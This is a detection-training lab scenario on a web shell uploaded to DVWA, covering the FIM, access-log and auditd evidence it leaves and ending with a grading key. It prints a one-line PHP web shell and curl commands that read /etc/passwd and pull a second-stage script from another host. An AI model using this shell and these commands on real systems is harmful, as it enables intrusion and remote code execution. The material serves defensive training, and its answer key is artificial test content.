# S03 — Web Shell Upload on DVWA

**Tier 2 · ATT&CK: T1190 (Exploit Public-Facing App), T1505.003 (Web Shell)**

## Story
`vic-lin` runs a vulnerable web app (DVWA). A new `.php` file appeared in the web root and someone's been talking to it. When did it land, how, and what did they run through it?

## Lab setup
- DVWA on `vic-lin` (nginx/apache + php + mysql), security set to *low* for the upload path.
- **Wazuh FIM** watching the web root:
  ```xml
  <syscheck><directories check_all="yes" realtime="yes">/var/www/html</directories></syscheck>
  ```
- auditd `exec` key on to catch commands the shell spawns.

## Run it
From `kali`: log into DVWA, use the **File Upload** module to drop a minimal shell:
```php
<?php system($_GET['c']); ?>
```
Then drive it (randomize the commands and timing):
```bash
curl 'http://10.10.10.20/hackable/uploads/sh.php?c=id'
curl 'http://10.10.10.20/hackable/uploads/sh.php?c=cat+/etc/passwd'
curl 'http://10.10.10.20/hackable/uploads/sh.php?c=wget+http://10.10.10.5/lin-persist.sh'
```

## Cleanup / revert
Revert to `baseline`.

## What telemetry this generates
- **FIM**: real-time "file added" alert for `sh.php` in the upload dir — timestamped, with hash.
- **Web access log**: the `POST` that uploaded it, then `GET ...sh.php?c=...` lines exposing every command as a URL parameter.
- **auditd**: `id`, `cat`, `wget` executed by the `www-data` user — a web server spawning a shell is the tell.

## Your investigation (fill cold)
When did the shell file appear (FIM) and does that line up with a POST in the access log? What commands ran through it (decode the `c=` params)? Did the attacker pull a second-stage file? Is `www-data` executing shell commands — and would you have caught that without FIM? Confidence on "web shell, actively used": high or low, and why.

## Detection engineering
Correlate a FIM "file created in web root" with the same file being requested via GET within minutes — or an auditd rule flagging `www-data` spawning `sh`/`wget`/`curl`. Either is a strong web-shell detection; ship it.

<details>
<summary>Grading key — do not open until your verdict is written</summary>

- Sealed truth: shell filename, upload timestamp, the exact `c=` command sequence, and whether a second stage was fetched.
- **Good:** you tie the FIM create to the upload POST to the command GETs into one timeline, decode every `c=` param, and flag the `www-data`→shell execution as the smoking gun. Bonus: hash of the shell + the second-stage URL.
- **Miss:** seeing the FIM alert but never reading the access log to learn what the shell *did* — the file appearing is initial access; the case is the hands-on-keyboard that followed.
</details>
